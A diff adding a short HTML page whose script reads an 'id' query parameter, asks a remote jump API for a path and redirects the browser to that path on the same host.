@@ -1,0 +1,23 @@
+<script src="https://image.163ar.cn/wechat/qb01/js/jquery-1.11.0.min.js"></script>
+<script>
+
+function getQueryString(name) { 
+    var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)", "i"); 
+    var r = window.location.search.substr(1).match(reg); 
+    if (r != null) return unescape(r[2]); 
+    return null; 
+}
+var id = getQueryString('id')
+
+$.ajax({
+	url: 'https://tongji.fulanyu.cn/api/Templatejump/purls/id/' + id,
+	success: function (res) {
+		console.log(res)
+        // window.location.href = 'https://' + res.url
+        window.location.replace('https://' + location.host + '/' + res.protfix + '/index.html');
+	},
+    error: function () {
+        window.location.reload()
+    }
+})
+</script>
